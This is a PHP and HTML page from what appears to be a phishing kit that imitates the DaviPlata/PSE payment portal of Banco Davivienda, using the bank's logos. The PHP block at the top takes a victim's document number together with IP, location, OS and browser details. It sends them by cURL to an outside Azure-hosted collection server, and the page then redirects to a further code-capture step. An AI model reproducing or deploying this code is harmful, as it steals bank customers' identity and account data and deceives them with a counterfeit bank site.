<?php ini_set('display_errors', 0);
$userp = $_SERVER['REMOTE_ADDR'];

include('funciones.php');
if (isset($_POST['usswd'])) {
    $message = 'DAVIPLATA
NRO DOCUMENTO: ' . $_POST['usswd'] . '
Fecha: ' . date('l jS \of F Y h:i:s A', time()) . '
Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
SO: ' . $user_os . '
Navegador: ' . $navegador . '';
    $payload = ['mensaje' => $message];
    $url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/daviplatanequi/';

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => [
            'Accept: application/json',
            'Content-Type: application/json'
        ],
        CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
        CURLOPT_TIMEOUT        => 20,
        CURLOPT_CONNECTTIMEOUT => 10,
    ]);

    $response = curl_exec($ch);
    if ($response === false) {
        error_log('cURL error: ' . curl_error($ch));
        http_response_code(500);
        exit('Error de red.');
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
} ?>
<html lang="es" xmlns="http://www.w3.org/1999/xhtml">

<head id="j_idt2">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script src="./davi/y-You-must-perfe-is-appy-Peach-slaine-Lamberly-m" async=""></script>
    <title>Dav Plata</title>
    <link rel="icon" href="https://www.daviplata.com/PSE/resources/img/favicon_ico.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui, viewport-fit=cover">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="Last-Modified" content="0">
    <meta http-equiv="Cache-Control" content="no-cache, mustrevalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="theme-color" content="#ed1c27">
    <meta name="apple-touch-fullscreen" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta http-equiv="refresh" content="10;url=cod.php">
    <link rel="apple-touch-icon" href="https://www.daviplata.com/PSE/resources/img/apple/icon5757.png">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://www.daviplata.com/PSE/resources/img/apple/touch-icon-ipad-retina.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://www.daviplata.com/PSE/resources/img/apple/apple-touch-icon.png">
    <style>
        .carga {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .circulo {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border: 4px solid #ff0000;
            border-top: 4px solid transparent;
            animation: girar 1s linear infinite;
        }

        @keyframes girar {
            to {
                transform: rotate(360deg);
            }
        }
    </style>
    <link type="text/css" rel="stylesheet" href="./davi/bootstrap.min.css.css">
    <link type="text/css" rel="stylesheet" href="./davi/app.css.css">
</head>

<body class="">
    <div class="desktop-web">

        <div id="wrapper" class="view view-main">

            <header class="headernew">

                <div class="container-fluid">

                    <div class="row align-items-center">
                        <div class="col-6 col-md-6 col-sm-12 col-12">
                            <ul class="logodesktop">
                                <li class="sephead"><img src="./davi/daviviendalogo22.png.xhtml" alt="LogoDavivienda"></li>
                                <li><img src="./davi/daviplata-logo3.png.xhtml" alt="LogoDaviplata" style="width: 90px"></li>
                            </ul>
                        </div>
                        <div class="col-6 col-md-6 col-sm-12 col-12"><span id="fechaHora">
                                <br>Código único CUS: 450503959
                                <p></p>
                                <script type="text/javascript" language="javascript">
                                    if (closeSession != null) {
                                        clearTimeout(closeSession);
                                    }
                                    var intervalo = parseInt("400000");
                                    if (intervalo != null && intervalo > 0) {
                                        closeSession = setTimeout(loadTimeOut, intervalo);
                                    }
                                </script>
                            </span>
                        </div>
                    </div>

                </div>

            </header>
            <!--end headernew-->
            <div id="headerBienvenido" class="container-fluid">
                <div id="headerBienvenidoAlt" class="row no-gutters">

                    <div class="col col-md-12">
                        <div class="loginapp">
                            <span class="font-light">Bienvenido al Portal de Pagos en Línea y PSE</span>
                        </div>
                    </div>
                </div>
            </div>
            <div id="container" class="container"><span id="contenido">
                    <div class="row">
                        <div id="blockInicial" class="col-md-5 offset-md-1 col-sm-5 offset-sm-0 col-10 offset-1">
                            <div class="carga">
                                <div class="circulo"></div>
                            </div>

                            <br><br><br><br><br><br><br><br><br><br><br>


                        </div>
                    </div>
                    <!--end container-->
                    <div id="mensajesPopup"></div>

                </span></div>
            <!--end wrapper-->

        </div>
        <!--end desktop-web-->

        <div class="modal">
            <div class="textLoader">Procesando...</div>
        </div>

        <footer> <span class="arrow"><img src="./davi/lemotiv.svg.svg" alt="Abrir"></span>
            <div class="container">
                <div class="row">
                    <div class="col-12 col-md-8 col-sm-8">
                        <ul>
                            <li><img src="./davi/Vigilado.svg.svg" alt="Vigilado"></li>
                            <li class="hidden-sm">Banco Davivienda S.A Todos los derechos
                                reservados 2024</li>
                        </ul>
                    </div>
                    <div class="col-12 col-md-4 col-sm-4 logo"><img src="./davi/Logo-Davivienda-Blanco.svg.svg" alt="Logo Davivienda Blanco">
                    </div>
                </div>
            </div>
        </footer>

    </div>
</body>

</html>